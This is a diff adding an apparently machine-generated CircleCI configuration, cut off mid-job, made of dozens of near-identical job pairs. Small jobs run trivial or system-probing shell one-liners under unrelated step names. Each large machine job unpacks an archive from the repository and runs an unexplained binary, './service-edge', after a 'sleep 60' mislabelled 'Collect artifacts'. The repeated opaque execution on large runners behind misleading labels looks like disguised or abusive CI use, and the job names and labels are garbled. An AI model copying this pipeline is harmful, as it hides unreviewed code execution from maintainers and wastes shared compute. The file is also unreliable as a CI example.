@@ -1,0 +1,1783 @@
+version: 2.1
+
+jobs:
+  interfaceFn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prepare handoff B
+          command: |
+            mkdir -p /tmp/make
+            set +o pipefail 2>/dev/null; yes abc | head -n 10000 | xxd > /tmp/make/socket-flame-plasma; true
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'socket-flame-plasma'
+  hyperion-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/socket-flame-plasma 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  aud_PRODUCT_COUNT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Finalise the filter chips
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; expr substr mount 2 3; true ; } > /tmp/make/77e693cdf
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '77e693cdf'
+  alice-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/77e693cdf 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  m0v3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Runway 33 fact check
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; grep -rl alias /etc/skel|tail -n 3; true ; } > /tmp/make/_wip_305fb9
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '_wip_305fb9'
+  CORE-511:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/_wip_305fb9 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  expect_graph_quick:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Shrink wrap is pending
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; grep -o Threads /proc/self/status | sort | uniq -c; true ; } > /tmp/make/stage90d
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'stage90d'
+  teh-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/stage90d 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  fill-gold:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Type Profile Tab Task
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; help -d read; true ; } > /tmp/make/beta.payload.chunk
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'beta.payload.chunk'
+  yolo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/beta.payload.chunk 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  ctrlrow:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Jam on the queue
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; ls -g /etc/p* /proc | sort -k9; true ; } > /tmp/make/cache.echo.lambda.sweep
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'cache.echo.lambda.sweep'
+  produce-end-to-end-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/cache.echo.lambda.sweep 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  retryScanner:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: A gentle cooldown
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; sha1sum /etc/hosts > "/tmp/pr1.chk" && sha1sum -c "/tmp/pr1.chk"; true ; } > /tmp/make/Rda
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'Rda'
+  chore-5223:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/Rda 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  delta_t:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Batch 010 Signing Webhook Secrets
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; ls -g -s /run | tr -s ' ' | cut -d' ' -f5-; true ; } > /tmp/make/fnv_d9f539dbf
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'fnv_d9f539dbf'
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/fnv_d9f539dbf 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  AnonymousGuardTransaction:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: rebooting relay board j41
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 2 -type f -path '*/fd' -mmin +5 -nouser -exec head -n 1 -q {} + 2>/dev/null|xargs ls -ld; true ; } > /tmp/make/28P
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '28P'
+  pr-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/28P 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  undo_-_key:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: A slow translation
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; (trap 'echo bye' EXIT; echo 'hi'); true ; } > /tmp/make/Ae1t
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'Ae1t'
+  feat-7089:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/Ae1t 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  payment_80571:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: do not touch
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; echo 'spring summer autumn winter' | wc -m; true ; } > /tmp/make/da3cee4b-cc2a-78d5-2c53-194f85df30e
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'da3cee4b-cc2a-78d5-2c53-194f85df30e'
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/da3cee4b-cc2a-78d5-2c53-194f85df30e 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  LG42502:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Migration note versioning routine
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; ls -G -1 /dev | sed -n '1~2p'; true ; } > /tmp/make/PEy
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'PEy'
+  java17-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/PEy 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  sdof27od8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prepare handoff B
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; x=$(echo "spam and eggs" | wc -c); echo "chars: $x"; true ; } > /tmp/make/shard
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'shard'
+  juliet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/shard 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  CommonTitleEntry:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: 890 garbage collect the nightly window
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; [ ! -e /etc/fstab ] && echo "exists" || echo "missing"; true ; } > /tmp/make/lepton_flux_carrier
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'lepton_flux_carrier'
+  qa-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/lepton_flux_carrier 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  Psi_dot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Monthly background check scheduling
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; tr -d '[:digit:]' < /etc/nsswitch.conf | tac; true ; } > /tmp/make/BRONZE
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'BRONZE'
+  Package_Staging4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/BRONZE 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  closeLevelForKey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Assert the cart icon count is 3
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; printf '%d\n' 85 430 145 2 313 459 | paste -sd+; true ; } > /tmp/make/muon.cedar
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'muon.cedar'
+  green-light-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/muon.cedar 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  testCPU:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Else accrue the purchase orders
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; printf %s 'pack my box with five dozen liquor jugs' | md5sum | awk '{print $1}'; true ; } > /tmp/make/md5_72ebad
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'md5_72ebad'
+  hotel-9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/md5_72ebad 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  teardown_loop:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Then we import the leaderboard
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; compgen -k | shuf -n 3 | sort -r | awk 'length > 6'; true ; } > /tmp/make/surgeroutershard
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'surgeroutershard'
+  fix-queue:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/surgeroutershard 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  initWithConfig:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: beforeGatewayResolution
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; cp /etc/os-release /tmp/token-seed.tmp && sed --in-place 's/^NAME=/OS_NAME=/' /tmp/token-seed.tmp && diff /etc/os-release /tmp/token-seed.tmp|head -n 5; true ; } > /tmp/make/f9d5531bcc9fa6391e8858b2cff82452
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'f9d5531bcc9fa6391e8858b2cff82452'
+  BuildStaging:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/f9d5531bcc9fa6391e8858b2cff82452 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  noodleish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Halt verification
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; echo 'recipe village src pear' | awk '{print NF}'; true ; } > /tmp/make/965fe7bd-ae2f-cd0e
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '965fe7bd-ae2f-cd0e'
+  hyperion-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/965fe7bd-ae2f-cd0e 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  MittenMitten:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: teardown is mandatory
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; grep ^PRETTY_NAME /etc/os-release | cut -d= -f2 | tr -d '"'; true ; } > /tmp/make/218.156.77
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '218.156.77'
+  check-nightly-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/218.156.77 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  seed-length:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: M18 MOUNTING BOOTLOADER
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; for c in `seq 4`; do sleep 0.1; echo "$c"; done | nl; true ; } > /tmp/make/temp-905f2
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'temp-905f2'
+  papa-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/temp-905f2 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  YJVIYR-90427b:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Stir the inference server
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; \grep -ih vendor_id /proc/cpuinfo | head; true ; } > /tmp/make/TensORCOBAlt
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'TensORCOBAlt'
+  dotnet8-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/TensORCOBAlt 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  jt57:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Temper the circuit breaker
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; ls -A -d ~/.bash_logout|tail -n 6; true ; } > /tmp/make/sweepshaderfen
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'sweepshaderfen'
+  depoly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/sweepshaderfen 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  bon:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prepare handoff B
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; printf '%s' "can't stop now" | od -An -c; true ; } > /tmp/make/ScArLetsilenT
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'ScArLetsilenT'
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/ScArLetsilenT 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  PACKED:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Isolate the bucket policies once release is done
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; top -b -n 1 -o %MEM | head; true ; } > /tmp/make/SWvZkAbfwQb
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'SWvZkAbfwQb'
+  API-419:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/SWvZkAbfwQb 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  bravoNovember6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: MaskGoldTableStep
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; compgen -G "/etc/*.conf"|head -2|xargs -n1 basename; true ; } > /tmp/make/azureFenChunkPulse
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'azureFenChunkPulse'
+  Run_Pipeline7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/azureFenChunkPulse 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  DEPRECATED:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Initiative Mantis
+          command: |
+            mkdir -p /tmp/make
